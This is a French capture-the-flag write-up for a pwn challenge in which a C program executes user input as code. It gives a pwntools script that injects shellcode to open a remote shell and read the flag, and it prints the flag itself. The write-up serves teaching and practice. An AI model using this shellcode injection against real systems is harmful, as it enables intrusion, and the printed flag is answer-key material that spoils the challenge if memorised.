## Enoncé

>Entre les lagons turquoise et les forêts tropicales denses, se trouve une île légendaire nommée Naori. Cette île est réputée pour abriter d'anciens esprits guerriers, gardiens de puissants secrets. Seuls les plus braves et les plus intelligents peuvent espérer marcher sur les traces de ces guerriers et découvrir les trésors cachés des temps anciens.
> 
> Un grand guerrier des temps anciens a laissé derrière lui une série d'épreuves pour tester la force et l'ingéniosité de ceux qui souhaiteraient suivre son chemin. Ces épreuves, connues sous le nom de "Chemin du Guerrier", commencent par un simple défi, mais chaque étape mène les aspirants plus près du secret ultime.
> 
> La deuxième étape de ce périple est annoncée par un message à l'entrée d'une grotte : "Celui qui souhaite maîtriser les esprits doit aussi apprendre à dompter les mots. Entrez, mais prenez garde : le moindre faux pas pourrait réveiller des forces que vous ne pouvez contrôler."
> 
> En entrant dans la grotte, vous découvrez un ancien artefact, un vieux totem, qui semble réagir à vos paroles. Cet artefact, connu sous le nom de "Totem de l'Exécution", est la clé de votre première épreuve. Il exécute tout ce qui lui est dit, sans poser de question. Mais attention, il est capricieux et n'aime pas les erreurs.


![paroles](../../../../attachements/paroles)

![paroles](../../../../attachements/paroles.c)
## Résolution

Ici on regarde le code : 
```c
#include <stdio.h>
#include <unistd.h>
void init(){
    fclose(stderr);
    setvbuf(stdin,  0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}
int main(){
    init();
    char buf[0x100]; 
    puts("Si vous réussissez à maîtriser le Totem, le chemin du guerrier s'ouvrira un peu plus devant vous. Mais ce n'est que le début. D'autres épreuves plus difficiles vous attendent, où chaque pas vous rapprochera un peu plus du secret ultime du guerrier légendaire.\n\nQu'avez-vous à me dire ?");
    read(0, buf, 0x100);
    void (* p )(); 
    p = (void (*)()) buf;
    p();
    return 0;
}
```

En gros le programme va prendre notre input et l’interpréter comme une fonction qu’il va appeler.

Le code nous indique (et chatgpt aussi d’ailleurs) de passer par un shellcode : une chaine qui va executer un code quand il sera appelé. Ce qu’on souhait nous, c’est avoir un shell pour récupérer le contenu du flag sur le serveur.

Et on va faire ça avec un script.

Injection de shellcode : 

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'paroles')

p = remote("challenges.hackagou.nc", 5001)

shellcode = asm(shellcraft.sh())

p.recv()
p.sendline(shellcode)
p.interactive()
p.close()
```

```bash
ls
cat flag.txt
```

>[!question]- Spoiler du flag
> OPENNC{13_Gu3rR13r_p4r13_54n5_R3gr37!}

